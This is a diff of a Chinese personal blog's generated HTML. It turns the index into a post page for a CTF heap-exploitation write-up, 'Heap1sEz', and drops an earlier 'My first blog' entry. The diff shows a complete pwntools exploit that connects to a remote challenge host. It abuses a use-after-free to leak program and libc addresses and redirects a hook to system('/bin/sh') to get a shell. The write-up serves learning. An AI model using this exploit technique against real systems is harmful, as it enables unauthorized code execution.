@@ -20,23 +20,31 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
 
-    <meta property="og:type" content="website">
-<meta property="og:title" content="Coding changes the world.">
-<meta property="og:url" content="http://example.com/index.html">
+    <meta name="description" content="堆的内部结构  在程序的执行过程中，我们称由 malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。  1234567891011121314151617&#x2F;*  This struct declaration is misleading (but accurate and necessary).  It declares a &amp;qu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Heap1sEz - 堆漏洞的简单利用">
+<meta property="og:url" content="http://example.com/2024/10/07/2024101-Heap1sEz---%E5%A0%86%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/index.html">
 <meta property="og:site_name" content="Coding changes the world.">
+<meta property="og:description" content="堆的内部结构  在程序的执行过程中，我们称由 malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。  1234567891011121314151617&#x2F;*  This struct declaration is misleading (but accurate and necessary).  It declares a &amp;qu">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-10-06T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-10-07T06:52:31.533Z">
 <meta property="article:author" content="summ2">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="unlink">
+<meta property="article:tag" content="UAF">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="http://example.com/">
+<link rel="canonical" href="http://example.com/2024/10/07/2024101-Heap1sEz---%E5%A0%86%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2024/10/07/2024101-Heap1sEz---%E5%A0%86%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/","path":"2024/10/07/2024101-Heap1sEz---堆漏洞的简单利用/","title":"Heap1sEz - 堆漏洞的简单利用"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>Coding changes the world.</title>
+<title>Heap1sEz - 堆漏洞的简单利用 | Coding changes the world.</title>
   
 
 
@@ -69,7 +77,7 @@
 
     <a href="/" class="brand" rel="start">
       <i class="logo-line"></i>
-      <h1 class="site-title">Coding changes the world.</h1>
+      <p class="site-title">Coding changes the world.</p>
       <i class="logo-line"></i>
     </a>
   </div>
@@ -95,7 +103,7 @@
   
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
@@ -108,6 +116,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A0%86%E7%9A%84%E5%86%85%E9%83%A8%E7%BB%93%E6%9E%84"><span class="nav-number">1.</span> <span class="nav-text">堆的内部结构</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">程序分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#checksec"><span class="nav-number">2.1.</span> <span class="nav-text">checksec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C"><span class="nav-number">2.2.</span> <span class="nav-text">程序运行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">2.3.</span> <span class="nav-text">源码分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-number">3.</span> <span class="nav-text">攻击流程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E7%A8%8B%E5%BA%8F%E5%9F%BA%E5%9D%80"><span class="nav-number">3.1.</span> <span class="nav-text">泄露程序基址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2-libc-%E5%9F%BA%E5%9D%80"><span class="nav-number">3.2.</span> <span class="nav-text">泄露 libc 基址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-unlink-%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99"><span class="nav-number">3.3.</span> <span class="nav-text">利用 unlink 实现任意地址读写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C-systembinsh"><span class="nav-number">3.4.</span> <span class="nav-text">执行 system(&#39;&#x2F;bin&#x2F;sh&#39;)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%A0%E5%8F%82"><span class="nav-number">3.4.1.</span> <span class="nav-text">传参</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#free_hook-%E5%8A%AB%E6%8C%81"><span class="nav-number">3.4.2.</span> <span class="nav-text">__free_hook 劫持</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#exp"><span class="nav-number">4.</span> <span class="nav-text">exp</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -138,16 +147,17 @@
 
     </div>
 
-    <div class="main-inner index posts-expand">
+    <div class="main-inner post posts-expand">
 
-    
+
+  
 
 
 <div class="post-block">
   
   
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/07/2024101-Heap1sEz---%E5%A0%86%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -161,13 +171,13 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Coding changes the world.">
+      <meta itemprop="name" content="Heap1sEz - 堆漏洞的简单利用 | Coding changes the world.">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/10/07/2024101-Heap1sEz---%E5%A0%86%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">Heap1sEz - 堆漏洞的简单利用</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          Heap1sEz - 堆漏洞的简单利用
+        </h1>
 
         <div class="post-meta-container">
           <div class="post-meta">
@@ -198,8 +208,7 @@
     
     
     
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="堆的内部结构">堆的内部结构</h1>
+    <div class="post-body" itemprop="articleBody"><h1 id="堆的内部结构">堆的内部结构</h1>
 <blockquote>
 <p>在程序的执行过程中，我们称由 malloc 申请的内存为 <code>chunk</code>
 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。</p>
@@ -284,7 +293,6 @@ src="/2024101-Heap1sEz---堆漏洞的简单利用\image-20241007121038110.png" /
 <h1 id="exp">exp</h1>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span> </span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./vuln&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;182.202.178.28&quot;</span>,<span class="number">31639</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">bss_addr = u64(p.recvuntil(<span class="string">&#x27;\x0a\x77\x65&#x27;</span>,drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">elfbase = bss_addr + <span class="number">0x8</span> - <span class="number">0x3810</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bss:&quot;</span>,<span class="built_in">hex</span>(bss_addr))</span><br><span class="line">note = elfbase + <span class="number">0x3880</span></span><br><span class="line">puts = elfbase + <span class="number">0x3780</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">16</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">16</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(note)+p64(puts))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x0a\x77\x65&#x27;</span>,drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">add(<span class="number">6</span>,<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">b&quot;/bin/sh&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;6&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;give me a hook\n&quot;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-      
     </div>
 
     
@@ -292,106 +300,28 @@ src="/2024101-Heap1sEz---堆漏洞的简单利用\image-20241007121038110.png" /
     
 
     <footer class="post-footer">
-        <div class="post-eof"></div>
-      
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+              <a href="/tags/heap/" rel="tag"><i class="fa fa-tag"></i> heap</a>
+              <a href="/tags/unlink/" rel="tag"><i class="fa fa-tag"></i> unlink</a>
+              <a href="/tags/UAF/" rel="tag"><i class="fa fa-tag"></i> UAF</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/10/01/Hello%20world!/" rel="prev" title="My first blog">
+                  <i class="fa fa-angle-left"></i> My first blog
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
     </footer>
   </article>
 </div>
 
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/01/Hello%20world!/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="summ2">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Coding changes the world.">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Coding changes the world.">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/10/01/Hello%20world!/" class="post-title-link" itemprop="url">My first blog</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2024-10-01 00:00:00" itemprop="dateCreated datePublished" datetime="2024-10-01T00:00:00+08:00">2024-10-01</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%97%A5%E5%B8%B8/" itemprop="url" rel="index"><span itemprop="name">日常</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="hello-world">Hello world!</h1>
-<p>在 Vidar-Team 的面试中，学长学姐问到了我有没有博客的问题。</p>
-<p>在这之前，我确实没有一个自己的博客，也没有写博客的想法。不过在这之后，我认识到写博客确实是一种记录自己思考、学习经历的好方法。所以，不妨就来试试看吧，用文字留下自己的脚印，写下生活学习中的美好、彷徨、收获。</p>
-<p>由于之前并没有搭建博客的经历，这对我也是一次接触新技术的机会。</p>
-<p>本博客是利用 Hexo 和 Github Pages
-运行的，可以说是比较方便、可靠的方法了。唯一的问题就是 Github
-偶尔会出现无法访问的情况。</p>
-<p>这里通过
-<i class="fa-brands fa-cloudflare" style="color: #f58220;"></i>
-Cloudflare 的 CDN 服务尽量避免这种情况的出现。</p>
-从写博客开始，我才开始接触怎么写 Markdown 、未来可能还会学习的 <span
-class="math inline">\(\LaTeX\)</span>
-，还有相关的网络知识之类的，要学的东西只会越来越多*^____^*。
-<head>
-<script defer src="https://use.fontawesome.com/releases/v5.0.13/js/all.js"></script>
-<script defer src="https://use.fontawesome.com/releases/v5.0.13/js/v4-shims.js"></script>
-</head>
-<p><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
 
 
 
